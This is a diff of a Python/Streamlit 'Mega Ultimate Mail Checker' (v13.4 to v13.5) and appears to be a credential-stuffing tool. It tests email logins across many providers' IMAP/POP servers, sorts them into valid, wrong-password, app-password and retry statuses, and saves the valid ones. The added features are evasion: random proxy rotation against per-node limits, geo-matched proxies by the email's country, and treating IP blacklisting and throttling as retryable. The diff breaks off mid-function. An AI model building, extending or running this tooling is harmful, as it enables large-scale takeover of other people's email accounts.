@@ -1,27 +1,27 @@
 """
-Mega Ultimate Mail Checker — v13.4
+Mega Ultimate Mail Checker — v13.5
 ==================================
 Self-healing import header + callback-safe Theme Studio + cached host resolution.
 
-v13.4 changes
+v13.5 changes
 -------------
-* NEW status: RETRY (retry_later) — server throttling / IP blocks are no longer
-  reported as account failures.
-* classify_error(): recognises "[ALERT] IP blacklisted", "Too many failed
-  attempts", "Login incorrect", "Authenticate error", and friends.
-* Proxy-level failure detection (_is_proxy_level_error) + per-rung proxy
-  ROTATION. One dead/407 proxy can no longer burn the whole ladder.
-* precheck_proxy_fast() now TUNNELS through the proxy, so a 407 node is caught
-  before it ever enters the live pool.
-* Direct retry now targets hosts that resolve on the LOCAL resolver, not just
-  the top-ranked ones.
-
-hosts.py ships in several shapes depending on which revision is deployed:
-    * new  -> conf / rank_hosts / is_junk_host  all present
-    * mid  -> conf only (no ranking helpers)
-    * old  -> neither conf nor ranking helpers
-Everything below falls back locally, so a stale hosts.py can never raise
-ImportError again.  The engine itself is unchanged.
+* status.py now actually imports (both naming conventions exported) — the
+  silent fallback constants are gone.
+* NEW statuses: RETRY_LATER (server throttle / IP block) and SMTP_FAILED
+  (DNS ok, SMTP dead). Neither is reported as an account failure any more.
+* NEW: SMTP failed check runs immediately after the fast-fail DNS check.
+* NEW: direct-fallback breadcrumb prints the REAL egress IP / region / country
+  plus your own VPN state, so a phone-side VPN can be seen in the log.
+* NEW sidebar toggles: Proxy Random Rotation (ON by default) and Geo-Call Proxy
+  (prefer a node in the email's country, with automatic fallback).
+* NEW: per-status live dropdowns + RETRY_LATER/SMTP_FAILED in the inspector,
+  the Engine Action Mode and the Live Report Log & Analytics.
+* Live stream colour contract: valid=green, wrong=red, connection failed=yellow,
+  app-password/2FA=blue, RETRY_LATER=white.
+* Start-lag killed: the progress bar renders BEFORE the pool refresh, and the
+  pool refresh is now parallel instead of one-proxy-at-a-time.
+* NO hardcoded proxy IPs and NO faked geo table. Everything is derived from
+  proxies.txt / Streamlit secrets / live DNS / live ip-api.
 """
 
 import streamlit as str_lit
@@ -58,7 +58,8 @@ HOSTS_HAS_RANKING = True
 HOSTS_IMPORT_NOTE = ""
 
 try:
-    from hosts import conf as host_conf, STRICT_APP, ZERO_ACCESS, PARENT, MS_DOMAINS, GMAIL_DOMAINS
+    from hosts import (conf as host_conf, STRICT_APP, ZERO_ACCESS, PARENT,
+                       MS_DOMAINS, GMAIL_DOMAINS, smtp_candidates as host_smtp_candidates)
 except Exception as _hosts_core_err:
     HOSTS_OK = False
     HOSTS_IMPORT_NOTE = f"hosts.py core import failed ({_hosts_core_err}); using built-in tables."
@@ -67,6 +68,9 @@ except Exception as _hosts_core_err:
     PARENT = {"memoad.jp": "biglobe.ne.jp"}
     MS_DOMAINS = {"outlook.com", "hotmail.com", "live.com", "msn.com", "hotmail.co.uk"}
     GMAIL_DOMAINS = {"gmail.com", "googlemail.com"}
+
+    def host_smtp_candidates(domain):
+        return []
 
     _BB_STATIC_CONF = {
         "gmail.com": (["imap.gmail.com"], ["pop.gmail.com"]),
@@ -85,13 +89,11 @@ except Exception as _hosts_core_err:
         "gmx.de": (["imap.gmx.net"], ["pop.gmx.net"]),
         "web.de": (["imap.web.de"], ["pop3.web.de"]),
         "t-online.de": (["secureimap.t-online.de"], ["securepop.t-online.de"]),
+        "freenet.de": (["imap.freenet.de"], ["pop.freenet.de"]),
         "free.fr": (["imap.free.fr"], ["pop.free.fr"]),
         "orange.fr": (["imap.orange.fr"], ["pop.orange.fr"]),
         "qq.com": (["imap.qq.com"], ["pop.qq.com"]),
         "naver.com": (["imap.naver.com"], ["pop.naver.com"]),
-        "montevideo.com.uy": (["mail.montevideo.com.uy", "webmail.montevideo.com.uy"], ["mail.montevideo.com.uy"]),
-        "adinet.com.uy": (["mail.adinet.com.uy"], ["mail.adinet.com.uy"]),
-        "antel.com.uy": (["mail.antel.com.uy"], ["mail.antel.com.uy"]),
     }
 
     def host_conf(domain):
@@ -107,10 +109,9 @@ try:
     from hosts import rank_hosts as host_rank_hosts, is_junk_host as host_is_junk
 except Exception as _hosts_rank_err:
     HOSTS_HAS_RANKING = False
-    _note = f"hosts.py has no rank_hosts/is_junk_host ({_hosts_rank_err}); using built-in router-aware ranking."
+    _note = f"hosts.py has no rank_hosts/is_junk_host ({_hosts_rank_err}); using built-in ranking."
     HOSTS_IMPORT_NOTE = (HOSTS_IMPORT_NOTE + " " + _note).strip() if HOSTS_IMPORT_NOTE else _note
 
-    # --- Exact copy of hosts.py ranking logic, so behaviour is identical ---
     _BB_ROUTER_LABEL_EXACT = re.compile(
         r"^(?:"
         r"mx|mx\d+|mta|mtas|mta\d+|smtp|smtps|smtpout|smtp-in|smtp-out|"
@@ -133,11 +134,6 @@ except Exception as _hosts_rank_err:
     _BB_SKIP_LABELS = {"mail", "email", "webmail", "imap", "imaps", "pop", "pop3", "smtp", "correo"}
 
     def host_is_junk(host, domain=None):
-        """True when a hostname is almost certainly a mail ROUTER (MX/MTA).
-
-        Catches Zimbra-style names such as 'zcs8-mvd-mta-mx7.example.com' that
-        a plain startswith(('mx','smtp')) test misses entirely.
-        """
         h = (host or "").lower().strip().strip(".")
         if not h:
             return True
@@ -159,7 +155,6 @@ except Exception as _hosts_rank_err:
         return False
 
     def _bb_tier(host, domain):
-        """0 = most likely correct ... 4 = last resort. Ordering only."""
         h = (host or "").lower().strip().strip(".")
         d = (domain or "").lower().strip().strip(".")
         if not h:
@@ -209,16 +204,14 @@ except Exception as _hosts_rank_err:
         return ok
 
     def host_rank_hosts(hosts, domain, probe=True):
-        """Composite ranking: tier -> DNS -> open port -> discovery order."""
+        """Resolves first, then tier, then port, then discovery order."""
         hosts = [h for h in (hosts or []) if h]
         if not hosts:
             return []
-
         indexed = list(enumerate(hosts))
         if not probe:
-            indexed.sort(key=lambda t: (_bb_tier(t[1], domain), 0 if _bb_resolves(t[1]) else 1, t[0]))
+            indexed.sort(key=lambda t: (0 if _bb_resolves(t[1]) else 1, _bb_tier(t[1], domain), t[0]))
             return [h for _i, h in indexed]
-
         tiers = {h: _bb_tier(h, domain) for h in set(hosts)}
         resolves = {h: _bb_resolves(h) for h in set(hosts)}
         to_probe = [h for h in dict.fromkeys(hosts) if tiers[h] <= 1 and resolves[h]][:6]
@@ -235,25 +228,61 @@ except Exception as _hosts_rank_err:
                             live[h] = False
             except Exception:
                 pass
-
         indexed.sort(key=lambda t: (
-            tiers.get(t[1], 4),
             0 if resolves.get(t[1], False) else 1,
+            tiers.get(t[1], 4),
             0 if live.get(t[1], False) else 1,
             t[0],
         ))
         return [h for _i, h in indexed]
 
+# --- status.py : both naming conventions are exported, so this always works ---
 try:
-    from status import VALID, WRONG, APP, FAILED, SKIP, UNKNOWN, RETRY
+    from status import (
+        VALID, WRONG, WRONG_PASSWORD, APP, NEED_APP_PASSWORD,
+        FAILED, CONNECTION_FAILED, SKIP, SKIPPED_COOLDOWN, UNKNOWN,
+        RETRY, RETRY_LATER, SMTP_FAILED, DNS_FAILED,
+        ALL_STATUSES as ST_ALL, LABELS as ST_LABELS, COLORS as ST_COLORS,
+        classify_error as st_classify, is_proxy_level_error as st_proxy_level,
+        display as st_display, color as st_color,
+    )
 except Exception as _status_err:
+    warnings.warn(f"status.py import failed ({_status_err}); using inline fallback.")
     VALID = "valid"
-    WRONG = "wrong_password"
-    APP = "need_app_password"
-    FAILED = "connection_failed"
-    SKIP = "skipped_cooldown"
+    WRONG = WRONG_PASSWORD = "wrong_password"
+    APP = NEED_APP_PASSWORD = "need_app_password"
+    FAILED = CONNECTION_FAILED = "connection_failed"
+    SKIP = SKIPPED_COOLDOWN = "skipped_cooldown"
     UNKNOWN = "unknown"
-    RETRY = "retry_later"
+    RETRY = RETRY_LATER = "retry_later"
+    SMTP_FAILED = "smtp_failed"
+    DNS_FAILED = "dns_failed"
+    ST_ALL = [VALID, WRONG_PASSWORD, NEED_APP_PASSWORD, RETRY_LATER, SMTP_FAILED,
+              DNS_FAILED, CONNECTION_FAILED, UNKNOWN, SKIPPED_COOLDOWN]
+    ST_LABELS = {s: s.upper() for s in ST_ALL}
+    ST_COLORS = {
+        VALID: "#22c55e", WRONG_PASSWORD: "#ef4444", CONNECTION_FAILED: "#eab308",
+        NEED_APP_PASSWORD: "#3b82f6", RETRY_LATER: "#ffffff", SMTP_FAILED: "#a855f7",
+        DNS_FAILED: "#f97316", UNKNOWN: "#94a3b8", SKIPPED_COOLDOWN: "#a78bfa",
+    }
+
+    def st_classify(raw, domain=""):
+        return UNKNOWN
+
+    def st_proxy_level(raw):
+        s = (raw or "").lower()
+        return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))
+
+    def st_display(s):
+        return ST_LABELS.get(s, s)
+
+    def st_color(s):
+        return ST_COLORS.get(s, "#cbd5e1")
+
+try:
+    from status import ALL as ST_ALL
+except Exception:
+    pass
 
 # Optional network libs
 try:
@@ -327,8 +356,9 @@ def default_theme() -> dict:
         "g1": p["g1"], "g2": p["g2"], "accent": p["accent"], "accent2": p["accent2"],
         "bg": p["bg"], "panel": p["panel"], "text": p["text"],
         "radius": 14, "glow": True, "animate": True, "glass": True,
-        "colorize_logs": True, "hero_title": "⚡ Mega Ultimate Mail Checker v13.4",
-        "hero_sub": "World-Coverage Edition — router-aware host ranking, proxy rotation, retryable IP-block handling, anti-spoofing post-auth validation.",
+        "colorize_logs": True,
+        "hero_title": "⚡ Mega Ultimate Mail Checker v13.5",
+        "hero_sub": "World-Coverage Edition — router-aware host ranking, rotating proxy pool, geo-call routing, retryable IP-block handling, SMTP reachability check, anti-spoofing post-auth validation.",
     }
 
 
@@ -394,7 +424,6 @@ def theme_css(th: dict) -> str:
     hr {{ border-color: {border} !important; }}
     a {{ color: {ac2} !important; }}
 
-    /* ---- Buttons ---- */
     .stButton > button, .stDownloadButton > button, .stFormSubmitButton > button {{
         background: {panel} !important; color: {text} !important;
         border: 1px solid {border} !important; border-radius: {r}px !important;
@@ -411,7 +440,6 @@ def theme_css(th: dict) -> str:
     }}
     .stButton > button[kind="primary"]:hover {{ filter: brightness(1.08); }}
 
-    /* ---- Metrics ---- */
     [data-testid="stMetric"] {{
         background: {panel} !important; border: 1px solid {border};
         border-left: 4px solid {ac}; border-radius: {r}px;
@@ -420,7 +448,6 @@ def theme_css(th: dict) -> str:
     [data-testid="stMetricValue"] {{ color: {ac} !important; font-weight: 800 !important; }}
     [data-testid="stMetricLabel"] {{ color: {dim} !important; }}
 
-    /* ---- Tabs ---- */
     .stTabs [data-baseweb="tab-list"] {{ gap: 6px; border-bottom: 1px solid {border}; }}
     .stTabs [data-baseweb="tab"] {{
         background: {panel}; border-radius: {r}px {r}px 0 0;
@@ -431,14 +458,12 @@ def theme_css(th: dict) -> str:
     }}
     .stTabs [data-baseweb="tab-highlight"] {{ background: {ac} !important; }}
 
-    /* ---- Expanders / Containers ---- */
     [data-testid="stExpander"] {{
         border: 1px solid {border} !important; border-radius: {r}px !important;
         background: {soft} !important; overflow: hidden;
     }}
     [data-testid="stExpander"] summary {{ color: {text} !important; font-weight: 600; }}
 
-    /* ---- Inputs ---- */
     input, textarea, select, .stTextInput input, .stTextArea textarea,
     .stNumberInput input, .stSelectbox div[data-baseweb="select"] > div {{
         background: {panel} !important; color: {text} !important;
@@ -447,21 +472,18 @@ def theme_css(th: dict) -> str:
     [data-baseweb="popover"] div {{ background: {panel} !important; color: {text} !important; }}
     [data-baseweb="tag"] {{ background: {ac}44 !important; color: {text} !important; }}
 
-    /* ---- Sliders / Progress / Toggles ---- */
     .stSlider [data-baseweb="slider"] div[role="slider"] {{ background: {ac} !important; }}
     .stProgress > div > div > div > div {{
         background: linear-gradient(90deg, {g1}, {g2}) !important;
     }}
     [data-baseweb="checkbox"] span, [data-baseweb="toggle"] span {{ border-color: {ac} !important; }}
 
-    /* ---- Code ---- */
     code, pre, .stCode, .stCodeBlock, [data-testid="stCodeBlock"] {{
         background: {bg} !important; color: {ac2} !important;
         border: 1px solid {border} !important; border-radius: 10px !important;
     }}
     [data-testid="stDataFrame"] {{ border: 1px solid {border} !important; border-radius: 10px !important; }}
 
-    /* ---- Custom components ---- */
     .bb-hero {{
         background: linear-gradient(135deg, {g1} 0%, {g2} 100%);
         padding: 26px 32px; border-radius: {r}px; margin-bottom: 18px;
@@ -499,17 +521,10 @@ def theme_css(th: dict) -> str:
     .bb-logbox {{
         background: {bg}; border: 1px solid {border}; border-radius: {r}px;
         padding: 10px 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-        font-size: .78rem; max-height: 360px; overflow-y: auto;
+        font-size: .78rem; max-height: 420px; overflow-y: auto;
     }}
-    .bb-log {{ padding: 1px 8px; border-left: 3px solid transparent; white-space: pre-wrap; word-break: break-word; }}
-    .bb-log.ok   {{ color: #34d399; border-color: #34d399; }}
-    .bb-log.bad  {{ color: #f87171; border-color: #f87171; }}
-    .bb-log.warn {{ color: #fbbf24; border-color: #fbbf24; }}
-    .bb-log.fail {{ color: #fb7185; border-color: #fb7185; }}
-    .bb-log.skip {{ color: #a78bfa; border-color: #a78bfa; }}
-    .bb-log.dim  {{ color: {text}; opacity: .82; border-color: transparent; }}
+    .bb-log {{ padding: 1px 8px; white-space: pre-wrap; word-break: break-word; }}
 
-    /* ---- Instant-help bubble (used by instant_help()) ---- */
     .help-box {{
         background: {panel}; border-left: 3px solid {ac};
         padding: 6px 10px; margin: 2px 0 8px 0;
@@ -539,6 +554,8 @@ def render_hero(th: dict):
                 <span class="bb-tag">Normal</span>
                 <span class="bb-tag">Deep / Aggressive</span>
                 <span class="bb-tag">Proxy Backed</span>
+                <span class="bb-tag">Geo-Call Routing</span>
+                <span class="bb-tag">SMTP Reachability</span>
                 <span class="bb-tag">Anti-Spoof Post-Auth</span>
             </div>
         </div>
@@ -556,25 +573,56 @@ def section_title(icon: str, title: str, subtitle: str = ""):
     )
 
 
+# ---------------------------------------------------------------------------
+# LIVE EXECUTION STREAM COLOUR CONTRACT
+#   valid = green | wrong = red | connection failed = yellow
+#   app password / 2FA = blue | RETRY_LATER = white
+# ---------------------------------------------------------------------------
+TAG_COLORS = {
+    "VALID": "#22c55e",
+    "WRONG_PASSWORD": "#ef4444",
+    "CONNECTION_FAILED": "#eab308",
+    "NEED_APP_PASSWORD": "#3b82f6",
+    "RETRY_LATER": "#ffffff",
+    "SMTP_FAILED": "#a855f7",
+    "DNS_FAILED": "#f97316",
+    "UNKNOWN": "#94a3b8",
+    "SKIPPED_COOLDOWN": "#a78bfa",
+    "EXCEPTION": "#fb7185",
+    "ERROR": "#fb7185",
+}
+
+
+def _line_color(line: str) -> str:
+    up = str(line).upper()
+    for tag in ("SKIPPED_COOLDOWN", "NEED_APP_PASSWORD", "WRONG_PASSWORD", "CONNECTION_FAILED",
+                "RETRY_LATER", "SMTP_FAILED", "DNS_FAILED", "VALID", "UNKNOWN", "EXCEPTION", "ERROR"):
+        if f"[{tag}]" in up:
+            return TAG_COLORS.get(tag, "#cbd5e1")
+    # trace fragments
+    if "[CLASSIFIED: VALID]" in up:
+        return TAG_COLORS["VALID"]
+    if "[CLASSIFIED: WRONG_PASSWORD]" in up:
+        return TAG_COLORS["WRONG_PASSWORD"]
+    if "[CLASSIFIED: NEED_APP_PASSWORD]" in up:
+        return TAG_COLORS["NEED_APP_PASSWORD"]
+    if "[CLASSIFIED: RETRY_LATER]" in up:
+        return TAG_COLORS["RETRY_LATER"]
+    if "[CLASSIFIED: SMTP_FAILED]" in up:
+        return TAG_COLORS["SMTP_FAILED"]
+    if "[CLASSIFIED: DNS_FAILED]" in up:
+        return TAG_COLORS["DNS_FAILED"]
+    if "[CLASSIFIED:" in up:
+        return TAG_COLORS["CONNECTION_FAILED"]
+    return ""
+
+
 def colorize_logs(lines: List[str]) -> str:
     out = []
     for ln in lines or []:
-        up = str(ln).upper()
-        if "[VALID]" in up:
-            cls = "ok"
-        elif "[WRONG]" in up:
-            cls = "bad"
-        elif "[APPASS]" in up or "[APP" in up:
-            cls = "warn"
-        elif "[SKIP]" in up:
-            cls = "skip"
-        elif "[RETRY]" in up:
-            cls = "warn"
-        elif "[FAILED]" in up or "[EXCEPTION]" in up or "[ERROR]" in up:
-            cls = "fail"
-        else:
-            cls = "dim"
-        out.append(f'<div class="bb-log {cls}">{html.escape(str(ln))}</div>')
+        col = _line_color(ln)
+        style = f"color:{col};" if col else "opacity:.85;"
+        out.append(f'<div class="bb-log" style="{style}">{html.escape(str(ln))}</div>')
     return f'<div class="bb-logbox">{"".join(out)}</div>'
 
 
@@ -591,8 +639,6 @@ if "theme" not in str_lit.session_state:
 if "colorize_logs" not in str_lit.session_state:
     str_lit.session_state.colorize_logs = str_lit.session_state.theme.get("colorize_logs", True)
 
-# Materialise theme.json on first boot so the reader always has a file to read
-# (Streamlit Cloud containers are ephemeral; a committed copy wins if present).
 if not os.path.exists(THEME_FILE):
     save_theme(str_lit.session_state.theme)
 
@@ -616,8 +662,6 @@ def _sync_theme_from_widgets():
 
 
 def _on_preset_change():
-    """Runs as a selectbox on_change callback -> BEFORE widgets are created,
-    so writing th_* widget keys here is legal."""
     name = str_lit.session_state.get("th_preset")
     p = THEME_PRESETS.get(name)
     if p:
@@ -628,7 +672,6 @@ def _on_preset_change():
 
 
 def _reset_theme():
-    """Runs as a button on_click callback -> BEFORE widgets are created."""
     str_lit.session_state.theme = default_theme()
     d = str_lit.session_state.theme
     for k in ("g1", "g2", "accent", "accent2", "bg", "panel", "text"):
@@ -646,8 +689,24 @@ def _reset_theme():
 # GLOBAL STATE
 # ============================================================================
 
-SEED_BAD_PROXIES = {"38.154.185.97"}
-DOMAIN_CACHE_TTL = 86400   # 24h — cached host discovery is reused within this
+DOMAIN_CACHE_TTL = 86400
+
+# --- TLD -> country NAME, matched against ip-api's country string.
+#     Knowledge table, not a faked geo database. ---
+TLD_COUNTRY = {
+    "de": "Germany", "at": "Austria", "ch": "Switzerland", "fr": "France",
+    "it": "Italy", "es": "Spain", "pt": "Portugal", "nl": "Netherlands",
+    "be": "Belgium", "pl": "Poland", "se": "Sweden", "no": "Norway",
+    "dk": "Denmark", "fi": "Finland", "ie": "Ireland", "cz": "Czechia",
+    "sk": "Slovakia", "gr": "Greece", "ro": "Romania", "hu": "Hungary",
+    "uk": "United Kingdom", "gb": "United Kingdom", "ca": "Canada",
+    "us": "United States", "au": "Australia", "nz": "New Zealand",
+    "br": "Brazil", "mx": "Mexico", "ar": "Argentina", "cl": "Chile",
+    "jp": "Japan", "kr": "South Korea", "in": "India", "tr": "Turkey",
+    "za": "South Africa", "ru": "Russia", "ua": "Ukraine", "il": "Israel",
+    "lt": "Lithuania", "lv": "Latvia", "ee": "Estonia", "bg": "Bulgaria",
+    "hr": "Croatia", "si": "Slovenia", "rs": "Serbia", "mx": "Mexico",
+}
 
 
 def load_persistent_valid_results():
@@ -681,7 +740,9 @@ if "valid_results" not in str_lit.session_state:
     str_lit.session_state.valid_results = loaded_valid
     str_lit.session_state.clean_valid_count = len(loaded_valid)
     str_lit.session_state.run_valid_count = len(loaded_valid)
-for _k in ("wrong_results", "need_app_results", "conn_results", "report_entries", "log_lines", "startup_entries"):
+for _k in ("wrong_results", "need_app_results", "conn_results", "retry_results",
+           "smtp_results", "dns_results", "skip_results",
+           "report_entries", "log_lines", "startup_entries"):
     if _k not in str_lit.session_state:
         str_lit.session_state[_k] = []
 if "zip_bytes" not in str_lit.session_state:
@@ -699,9 +760,6 @@ for _k in ("start_timestamp", "end_timestamp", "total_duration"):
         str_lit.session_state[_k] = None
 
 
-# Buffer used by background threads so they never touch st.session_state.
-# This is what kills the 'missing ScriptRunContext!' flood from the alive-pool.
-# It is also merged back into the Startup panel (see below) so nothing is lost.
 _STARTUP_BUFFER = []
 _STARTUP_BUFFER_LOCK = threading.Lock()
 
@@ -724,7 +782,6 @@ def log_startup(msg, quiet: bool = False):
 
 
 def startup_panel_lines():
-    """Main-thread entries plus whatever the background thread buffered."""
     try:
         main = list(str_lit.session_state.startup_entries)
     except Exception:
@@ -746,7 +803,7 @@ cache_lock = threading.Lock()
 proxy_lock = threading.Lock()
 file_write_lock = threading.Lock()
 session_state_lock = threading.Lock()
-bad_proxies = set(SEED_BAD_PROXIES)
+bad_proxies = set()                     # NOTHING pre-seeded
 alive_pool = []
 alive_pool_lock = threading.Lock()
 consecutive_proxy_failures = defaultdict(int)
@@ -754,6 +811,14 @@ circuit_breaker_until = {}
 failed_domain_cache = {}
 _host_dns_cache = {}
 _host_dns_lock = threading.Lock()
+
+_rr_lock = threading.Lock()
+_rr_index = 0
+
+_GEO_CACHE = {}
+_GEO_LOCK = threading.Lock()
+_PUBLIC_IP = {"ip": "", "ts": 0.0}
+_DIRECT_GEO = {"ts": 0.0, "ip": "", "country": "Unknown", "region": "Unknown"}
 
 
 @dataclass
@@ -788,8 +853,6 @@ except Exception as e:
 WEBSHARE_KEYS = [line.strip() for line in os.getenv("WEBSHARE_KEYS", "").splitlines() if line.strip()]
 OXYLABS_PROXIES = [line.strip() for line in (os.getenv("OXYLABS_BASE") or os.getenv("OXYLABS_PROXIES") or "").splitlines() if line.strip()]
 log_startup(f"Secrets keys: webshare={len(WEBSHARE_KEYS)} oxylabs={len(OXYLABS_PROXIES)}")
-if not WEBSHARE_KEYS and not OXYLABS_PROXIES:
-    str_lit.sidebar.error("No proxy keys. Add WEBSHARE_KEYS and OXYLABS_BASE in Settings -> Secrets.")
 
 if "help_states" not in str_lit.session_state:
     str_lit.session_state.help_states = {}
@@ -882,7 +945,7 @@ str_lit.sidebar.markdown("### 🎛 Advanced Control Rules")
 dynamic_worker_scaling = str_lit.sidebar.toggle("⚡ Thread Auto-Scaling / Dynamic Workers", value=True,
                                                 help="Let the engine scale worker threads with live network conditions.")
 max_hosts_per_domain = str_lit.sidebar.slider(
-    "Max Hosts Per Domain", 1, 6, default_hosts, 1,
+    "Max Hosts Per Domain", 1, 8, default_hosts, 1,
     help="How many discovered IMAP hosts to try per account. STARTTLS / plain and POP rungs are capped separately."
 )
 try_alt_username_ui = str_lit.sidebar.toggle(
@@ -899,7 +962,24 @@ min_proxy_score = str_lit.sidebar.slider("Min Proxy Score", 0, 100, 40, 10)
 proxy_precheck_timeout = str_lit.sidebar.slider("Proxy Pre-Check Timeout (Sec)", 1, 10, 3, 1)
 allow_blacklist_ips = str_lit.sidebar.toggle(
     "Allow Blacklisted / Flagged Proxy IPs", value=False,
-    help="When disabled (default), the seed spoofing IP and any circuit-broken proxy are excluded from BOTH the pool AND the live ladder."
+    help="When disabled (default), circuit-broken proxies are excluded from BOTH the pool AND the live ladder."
+)
+
+str_lit.sidebar.markdown("---")
+str_lit.sidebar.markdown("### 🔀 Proxy Routing Intelligence")
+proxy_random_rotation = str_lit.sidebar.toggle(
+    "🔀 Proxy Random Rotation", value=True,
+    help="ON: a different random node is used for every attempt (best against per-node 407 caps). "
+         "OFF: the pool is walked in file order, round-robin."
+)
+geo_call_proxy = str_lit.sidebar.toggle(
+    "🌍 Geo-Call Proxy", value=False,
+    help="Prefer a node whose geo matches the email's country/region (e.g. a @freenet.de account gets a DE node). "
+         "Automatically falls back to the general pool the moment a matched node fails."
+)
+my_connection = str_lit.sidebar.selectbox(
+    "📶 My own connection (stamped on direct fallbacks)", ["Auto", "VPN ON", "VPN OFF"], index=0,
+    help="Purely diagnostic: recorded on every direct-fallback line so a phone-side VPN is visible in the log."
 )
 
 if "pool_mode" not in str_lit.session_state:
@@ -907,7 +987,7 @@ if "pool_mode" not in str_lit.session_state:
 if "pool_locked" not in str_lit.session_state:
     str_lit.session_state.pool_locked = True
 if "picked_countries" not in str_lit.session_state:
-    str_lit.session_state.picked_countries = ["US"]
+    str_lit.session_state.picked_countries = []
 
 
 def load_json(path, default=None):
@@ -931,22 +1011,26 @@ proxy_meta = load_json("proxy_meta.json", {})
 
 
 def load_proxies(quiet: bool = False):
-    if not os.path.exists("proxies.txt") or os.path.getsize("proxies.txt") == 0:
+    """Proxies come from proxies.txt only. If the file does not exist we create
+    it from the secret-provided list; if there are no secrets either, the file
+    stays EMPTY and the engine runs fully direct. Nothing is pre-added."""
+    if not os.path.exists("proxies.txt"):
         try:
             with file_write_lock:
                 with open("proxies.txt", "w", encoding="utf-8") as f:
-                    f.write("\n".join(OXYLABS_PROXIES[:]) + "\n")
-            log_startup("Initialized default proxies.txt file.", quiet=quiet)
+                    if OXYLABS_PROXIES:
+                        f.write("\n".join(OXYLABS_PROXIES) + "\n")
+            log_startup(f"Created proxies.txt (seeded from secrets: {len(OXYLABS_PROXIES)}).", quiet=quiet)
         except Exception as e:
-            log_startup(f"WARNING: Failed to initialize default proxies.txt: {e}", quiet=quiet)
+            log_startup(f"WARNING: Failed to initialize proxies.txt: {e}", quiet=quiet)
     try:
         with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
             raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
         log_startup(f"Loaded {len(raw_list)} proxies from proxies.txt.", quiet=quiet)
-        return raw_list if raw_list else OXYLABS_PROXIES
+        return raw_list
     except Exception as e:
         log_startup(f"WARNING: Failed to read proxies.txt: {e}", quiet=quiet)
-        return OXYLABS_PROXIES
+        return []
 
 
 def compute_real_score(success_count, fail_count, initial_latency_score=80):
@@ -990,6 +1074,96 @@ def parse_proxy(proxy_str):
     return None
 
 
+# ---------------------------------------------------------------------------
+# LIVE GEO (no static table — everything comes from ip-api)
+# ---------------------------------------------------------------------------
+def geo_lookup(ip):
+    if not ip or ip == "Unknown":
+        return ("Unknown", "Unknown")
+    with _GEO_LOCK:
+        hit = _GEO_CACHE.get(ip)
+    if hit:
+        return hit
+    country, region = "Unknown", "Unknown"
+    try:
+        if requests is not None:
+            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName", timeout=3)
+            if r.status_code == 200:
+                data = r.json()
+                if data.get("status") == "success":
+                    country = data.get("country") or "Unknown"
+                    region = data.get("regionName") or "Unknown"
+    except Exception:
+        pass
+    with _GEO_LOCK:
+        _GEO_CACHE[ip] = (country, region)
+    return country, region
+
+
+def public_ip(force=False):
+    if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < 600:
+        return _PUBLIC_IP["ip"]
+    ip = ""
+    try:
+        if requests is not None:
+            ip = (requests.get("https://api.ipify.org", timeout=3).text or "").strip()
+    except Exception:
+        ip = ""
+    if not ip:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+        except Exception:
+            ip = ""
+    if ip:
+        _PUBLIC_IP.update(ip=ip, ts=time.time())
+    return ip or "Unknown"
+
+
+def direct_geo(force=False):
+    """Real egress IP + its geo, for the direct-fallback breadcrumb."""
+    if not force and time.time() - _DIRECT_GEO["ts"] < 600 and _DIRECT_GEO["ip"]:
+        return dict(_DIRECT_GEO)
+    ip = public_ip(force=force)
+    country, region = geo_lookup(ip)
+    _DIRECT_GEO.update(ts=time.time(), ip=ip, country=country, region=region)
+    return dict(_DIRECT_GEO)
+
+
+def tld_country(domain):
+    for part in reversed((domain or "").lower().split(".")):
+        if part in TLD_COUNTRY:
+            return TLD_COUNTRY[part]
+    return None
+
+
+def enrich_proxy_geo(proxies, max_workers=8):
+    """Fill proxy_meta country/region for geo-call. Parallel, best-effort."""
+    todo = []
+    for p in proxies:
+        meta = proxy_meta.get(p)
+        if not meta or not meta.get("country") or meta.get("country") == "Unknown":
+            info = parse_proxy(p)
+            if info:
+                todo.append((p, info["host"]))
+    if not todo:
+        return
+    def _one(item):
+        p, host = item
+        return p, host, geo_lookup(host)
+    try:
+        with ThreadPoolExecutor(max_workers=max_workers) as ex:
+            for p, host, (country, region) in ex.map(_one, todo):
+                with proxy_lock:
+                    m = proxy_meta.setdefault(p, {"fails": 0, "success": 0, "score": 60, "latency_ms": 0})
+                    m["country"], m["region"] = country, region
+        save_proxy_meta()
+    except Exception as e:
+        log_startup(f"WARNING: proxy geo enrichment error: {e}", quiet=True)
+
+
 def test_single_proxy(proxy_str):
     try:
         info = parse_proxy(proxy_str)
@@ -1000,33 +1174,18 @@ def test_single_proxy(proxy_str):
 
         start = time.time()
         test_success = False
-        sock = None
-        try:
-            kw = {"proxy_type": socks.SOCKS5, "proxy_addr": info["host"], "proxy_port": info["port"]}
-            if info["user"]:
-                kw["proxy_username"] = info["user"]
-                kw["proxy_password"] = info["pass"]
-            sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kw)
-            test_success = True
-        except Exception:
-            pass
-        finally:
-            if sock:
-                try:
-                    sock.close()
-                except Exception:
-                    pass
-
-        if not test_success:
+        for ptype in (socks.SOCKS5, socks.HTTP):
+            sock = None
             try:
-                kw = {"proxy_type": socks.HTTP, "proxy_addr": info["host"], "proxy_port": info["port"]}
+                kw = {"proxy_type": ptype, "proxy_addr": info["host"], "proxy_port": info["port"]}
                 if info["user"]:
                     kw["proxy_username"] = info["user"]
                     kw["proxy_password"] = info["pass"]
                 sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kw)
                 test_success = True
+                break
             except Exception:
-                pass
+                continue
             finally:
                 if sock:
                     try:
@@ -1039,20 +1198,12 @@ def test_single_proxy(proxy_str):
         country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
         region = proxy_meta.get(proxy_str, {}).get("region", "Unknown")
 
-        if country == "Unknown" and requests:
-            try:
-                r = requests.get(f"http://ip-api.com/json/{info['host']}?fields=status,country,regionName", timeout=1.5)
-                if r.status_code == 200:
-                    data = r.json()
-                    if data.get("status") == "success":
-                        country = data.get("country", "Unknown")
-                        region = data.get("regionName", "Unknown")
-            except Exception:
-                pass
+        if country == "Unknown":
